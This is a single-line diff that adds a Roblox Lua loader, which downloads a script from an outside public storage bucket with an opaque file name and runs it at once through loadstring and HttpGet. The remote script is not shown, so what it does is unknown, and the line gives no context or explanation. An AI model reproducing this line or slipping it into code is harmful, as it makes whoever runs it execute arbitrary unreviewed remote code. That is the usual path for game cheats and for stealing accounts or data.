@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://irxlkyikjodracjrigdr.supabase.co/storage/v1/object/public/robloxscirptsbycorex/eiogfheuigehiewmhcv84mhgv49hv49.lua"))()
